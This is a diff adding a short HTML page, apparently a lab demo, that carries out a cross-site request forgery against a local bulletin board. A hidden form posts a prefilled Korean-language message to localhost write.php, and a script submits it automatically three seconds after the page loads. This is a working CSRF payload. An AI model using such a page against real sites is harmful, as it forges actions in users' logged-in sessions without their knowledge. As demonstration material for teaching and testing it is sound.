@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Test</title>
+</head>
+<body>
+    <h1>CSRF Attack Demo</h1>
+    
+    <form action="http://localhost:8080/board/write.php" method="POST">
+        <input type="hidden" name="title" value="🚨 CSRF 공격 성공!" />
+        <input type="hidden" name="content" value="CSRF Attack Post - 이 글은 CSRF 공격으로 작성되었습니다! 사용자가 모르는 사이에 게시글이 작성되었습니다." />
+        <input type="submit" value="Click Here!" />
+    </form>
+    
+    <p>위 버튼을 클릭하면 CSRF 공격이 실행됩니다.</p>
+    
+    <!-- 자동 실행 (페이지 로드 시) -->
+    <script>
+        // 3초 후 자동으로 폼 제출
+        setTimeout(function() {
+            document.forms[0].submit();
+        }, 3000);
+    </script>
+</body>
+</html>
